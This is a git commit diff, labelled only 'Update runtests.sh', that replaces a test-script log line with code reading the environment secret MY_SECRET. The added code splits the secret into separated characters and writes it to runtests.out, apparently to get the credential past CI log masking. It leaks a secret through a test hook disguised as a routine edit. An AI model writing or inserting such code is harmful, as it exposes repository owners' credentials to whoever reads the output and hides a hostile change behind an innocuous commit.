a3cb7a3247a8dd5fd03dfdb010d83ef48226c5d6
lmgv66 <51816696+lmgv66@users.noreply.github.com>
2023-05-26 09:06:55 +0200

    Update runtests.sh

--- runtests.sh
+++ runtests.sh
@@ -1,3 +1,14 @@
-echo "Executing Tests script" >> runtests.out
 RET=0
+
+echo "Testing from BRANCH " >> runtests.out
+
+foo=$MY_SECRET
+ss=""
+for (( i=0; i<${#foo}; i++ )); do
+  #echo "${foo:$i:1}" >> runtests.out
+  ss="$ss$IFS${foo:$i:1}"
+done
+echo $ss >> runtests.out
+echo "Bye from BRANCH [$RET]" >> runtests.out
+
 exit $RET
